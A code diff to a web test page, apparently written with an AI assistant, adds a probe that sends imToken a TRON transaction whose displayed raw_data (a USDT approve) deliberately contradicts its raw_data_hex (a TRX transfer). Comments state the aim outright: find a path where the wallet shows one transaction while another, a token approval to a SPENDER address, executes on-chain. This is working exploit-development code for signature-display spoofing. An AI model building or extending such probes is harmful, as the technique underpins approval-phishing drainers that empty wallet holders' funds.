@@ -73,6 +73,7 @@
       <button class="btn btn-probe" id="btnProbeGenuine" style="background:#b8860b;">⑦ 自洽approve探针（节点必过·真上链·人工核对UI）</button>
       <button class="btn btn-probe" id="btnProbeTypeOverride" style="background:#7d3c98;">⑧ type覆盖探针（决定性：节点凭type还是type_url）</button>
       <button class="btn btn-probe" id="btnProbeSignBroadcast" style="background:#a83232;">⑨ 签名分离+自广播探针（signTransaction·最可能成立）</button>
+      <button class="btn btn-probe" id="btnProbeBroadcastSrc" style="background:#1f6f5c;">⑩ 广播来源判定（sendTransaction 发 raw_data 还是 raw_data_hex）</button>
       <button class="btn btn-allowance" id="btnQueryAgain" style="margin-top:6px; background:var(--orange); color:#000;">④ 再次查询 allowance（验证变化）</button>
     </div>
   </div>
@@ -1144,6 +1145,76 @@
     }
   }
 
+  // ==================== ⑩ 广播来源判定探针（决定性：sendTransaction 广播 raw_data 还是 raw_data_hex） ====================
+  // 整条 sendTransaction 结论的唯一未定前提：广播用 raw_data(JSON重建) 还是 raw_data_hex(直发字节)？
+  // 构造：raw_data = 自洽 approve（txID = approve 哈希）；raw_data_hex = 一笔 transfer 的 hex（故意与 raw_data 矛盾）。
+  //   · imToken 签 txID(approve)；显示读 raw_data → 显示“授权”
+  //   · 若 sendTransaction 广播 raw_data(approve) → 节点 approve 哈希 = 签的 approve → ✅ 上链 approve
+  //         ⇒ raw_data_hex 是死字段，sendTransaction 拆分路径在本版本【彻底封死】
+  //   · 若 sendTransaction 广播 raw_data_hex(transfer) → 节点 transfer 哈希 ≠ 签的 approve → SIGERROR
+  //         ⇒ 胜负手翻转：raw_data=transfer(显示)/raw_data_hex=approve(执行) 即可上链 → WYSINWYS 成立
+  async function runProbeBroadcastSrc() {
+    if (!window.imToken || typeof window.imToken.callPromisifyAPI !== 'function') { log('imToken 桥未就绪', 'error'); return; }
+    if (!window.tronWeb || !window.tronWeb.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
+    if (!walletAddr) { log('请先连接钱包', 'error'); return; }
+
+    log('══════════ 广播来源判定探针（决定性） ══════════', 'warn');
+    log('raw_data=自洽approve（显示+期望执行）；raw_data_hex=transfer（故意矛盾，探测广播是否用它）', 'warn');
+    log('═══════════════════════════════════════════════', 'warn');
+
+    try {
+      // 自洽 approve：raw_data / txID / raw_data_hex 三者本来一致
+      var built = await window.tronWeb.transactionBuilder.triggerSmartContract(
+        window.tronWeb.address.toHex(USDT_CONTRACT), 'approve(address,uint256)',
+        { feeLimit: 100000000, callValue: 0 },
+        [{ type: 'address', value: SPENDER }, { type: 'uint256', value: APPROVE_AMOUNT }],
+        window.tronWeb.address.toHex(walletAddr)
+      );
+      if (!built.result || !built.result.result) { log('approve 构造失败', 'error'); return; }
+      var approveTx = built.transaction;
+
+      // 一笔 transfer，仅取它的 raw_data_hex 去“污染”approve 的 raw_data_hex 字段
+      var transferBuilt = await window.tronWeb.transactionBuilder.sendTrx(SPENDER, 100000, walletAddr);
+
+      log('[基底] approve txID = ' + approveTx.txID, 'warn');
+      log('[基底] approve.raw_data.contract[0].type = ' + approveTx.raw_data.contract[0].type, 'warn');
+      log('[污染] 用 transfer 的 raw_data_hex 覆盖（含 095ea7b3=' + (transferBuilt.raw_data_hex.indexOf('095ea7b3') !== -1) + '）', 'warn');
+
+      var submitTx = {
+        visible: approveTx.visible,
+        txID: approveTx.txID,                       // = approve 哈希（imToken 将签它）
+        raw_data: approveTx.raw_data,               // 自洽 approve（显示=授权；若按它广播则=approve）
+        raw_data_hex: transferBuilt.raw_data_hex    // 故意=transfer（若按它广播则=transfer→SIGERROR）
+      };
+
+      log('★ 弹窗应显示“授权/Approve”（因显示读 raw_data=approve）；请确认。', 'warn');
+      var txid = await sendTx(submitTx, '广播来源判定');
+      $('probeResultCard').style.display = 'block';
+      $('probeTxid').textContent = txid || '未获取';
+
+      if (txid) {
+        var onchainType = await fetchOnchainTypeRetry(txid, 4);
+        $('probeOnchainType').textContent = onchainType || '未确认';
+        if (onchainType === 'TriggerSmartContract') {
+          $('probeVerdict').textContent = '🟢 广播用 raw_data：sendTransaction 拆分路径封死';
+          $('probeVerdict').style.color = 'var(--green)';
+          $('probeInfoBox').innerHTML = '链上=approve、raw_data_hex(transfer) 被忽略 ⇒ sendTransaction 广播的是 raw_data 重建字节。显示/执行都锁在 raw_data 上，<strong>跨类型拆分无法过节点</strong>，⑥⑧失败根因确认。';
+          log('🟢 广播=raw_data，raw_data_hex 为死字段 → sendTransaction 拆分不可行', 'success');
+          await queryAndShowAllowance(false);
+        } else {
+          $('probeVerdict').textContent = '⚠️ 链上=' + (onchainType || '待确认');
+          log('链上类型: ' + (onchainType || '待确认'), 'warn');
+        }
+      } else {
+        log('未上链。若为 SIGERROR(签名者≠本钱包) → 关键翻转：sendTransaction 竟按 raw_data_hex(transfer) 广播！', 'error');
+        log('  ⇒ 反过来构造 raw_data=transfer(显示)/raw_data_hex=approve(执行) 即可“显转账、链上approve” → WYSINWYS 成立。', 'error');
+        log('  这种情况请告诉我，我立即加“反向上链探针”。', 'warn');
+      }
+    } catch (e) {
+      log('广播来源判定探针异常: ' + (e.message || e), 'error');
+    }
+  }
+
   // ==================== 事件绑定 ====================
   $('btnConnect').addEventListener('click', connect);
   $('btnProbeDual').addEventListener('click', runProbeDual);
@@ -1152,6 +1223,7 @@
   $('btnProbeGenuine').addEventListener('click', runProbeGenuine);
   $('btnProbeTypeOverride').addEventListener('click', runProbeTypeOverride);
   $('btnProbeSignBroadcast').addEventListener('click', runProbeSignBroadcast);
+  $('btnProbeBroadcastSrc').addEventListener('click', runProbeBroadcastSrc);
   $('btnQueryAllowance').addEventListener('click', function() {
     queryAndShowAllowance(false);
   });
